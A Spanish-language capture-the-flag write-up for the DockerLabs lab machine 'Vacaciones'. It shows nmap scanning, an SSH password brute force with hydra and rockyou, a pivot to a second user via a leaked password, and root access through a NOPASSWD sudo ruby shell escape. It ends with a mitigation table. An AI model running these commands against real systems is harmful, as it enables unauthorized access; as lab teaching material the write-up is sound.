# Writeup: Vacaciones - DockerLabs

- **Máquina:** Vacaciones (DockerLabs)
- **Enlace:** https://dockerlabs.es/maquinas/46/descargar
- **Dificultad:** Muy Fácil
- **Fecha:** 21 de Octubre 2026

---

## Objetivo
Realizar ataque de fuerza bruta mediante SSH y escalar privilegios en Linux.

---

## Despliegue de la máquina
```bash
$ sudo bash auto_deploy.sh vacaciones.tar
Máquina desplegada, su dirección IP es --> 172.17.0.2
```

---

## 1. Reconocimiento
Se utilizó `nmap` para el escaneo de puertos, revelando dos puertos abiertos:

```bash
sudo nmap -p- -sCV 172.17.0.2
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```
--- 

## 2. Identificación de vulnerabilidades
Al buscar la dirección IP en un navegador aparece una página en blanco pero si inspeccionamos dicha página, podemos ver un comentario de uno de los desarrolladores que revela la existencia de dos ususarios: **Juan** y **Camilo**.

<img width="664" height="139" alt="Captura de pantalla (243)" src="https://github.com/user-attachments/assets/d4b26373-846d-483c-97d8-ceafa6a0b88f" />


---
## 3. Explotación
### 1. Ataque de fuerza bruta al usuario Camilo
Se utilizó `hydra` como herramienta para obtener las credenciales del usuario **Camilo**.
```bash
$ hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```
```bash
[22][ssh] host: 172.17.0.2   login: camilo   password: password1
1 of 1 target successfully completed, 1 valid password found
```
Una vez conseguidas las credenciales, procedemos a conectarnos como **Camilo** mediante `ssh`.

<img width="678" height="191" alt="Captura de pantalla (245)" src="https://github.com/user-attachments/assets/92395dd7-ab5f-4ebc-bae4-cef46e760ec4" />


### 2. Pivote al usuario Juan
Para conseguir más información sobre el ususario **Juan**, se procede a leer el mensaje que dejó a **Camilo**, guardado en el directorio `var/mail` en formato `.txt`.

<img width="1040" height="89" alt="Captura de pantalla (248)" src="https://github.com/user-attachments/assets/16deae16-8ee5-440e-974d-295d5adfc9ed" />


Para acceder a la cuenta de **Juan**, se utilizó el mismo método y herramienta visto en el paso 1.
```bash
$ ssh juan@172.17.0.2
```
```bash
juan@172.17.0.2's password: (2k84dicb)
$ whoami
juan
```

### 3. Escalada de privilegios
Al usar `sudo -l` se observa que **Juan** tiene permisos para ejecutar `ruby` como `root` sin necesidad de ingresar contraseña.

<img width="512" height="70" alt="Captura de pantalla (250)" src="https://github.com/user-attachments/assets/5debd6e9-6971-4f56-9ef4-f63fd682fdb1" />

La escalada de privilegios finaliza al ejecutar el siguiente comando:

```bash
$ sudo ruby -e 'exec "/bin/bash"'
root@vacaciones:~# whoami
root
```

---
## Acciones de mitigación según vulnerabilidad
| Fase del Ataque | Vector Vulnerable | Mitigación |
| :--- | :--- | :--- |
| **Reconocimiento** | Comentarios en código fuente con nombres de usuario y filtración de datos en correos internos. | Limpieza del código y evitar almacenar credenciales o información sensible en texto plano. |
| **Autenticación** | Contraseñas débiles vulnerables a ataques de fuerza bruta con Hydra. |Aplicar políticas de contraseñas más seguras e implementar verificación en dos pasos (MFA). |
| **Escalada de privilegios** | Uso de `NOPASSWD` y permisos sobre el binario intérprete completo. | Aplicar principio de menor privilegio, no conceder `NOPASSWD` sobre interpretes.|
---
## Conclusión
Mediante un simple comentario en el código, se pudo acceder a las credenciales de un usuario de contraseña débil mediante fuerza bruta para luego pivotar a otro usuario y escalar privilegios hasta llegar a `root`. Esto demuestra la importancia de mantener el código limpio y la información sensible bien resguardada.
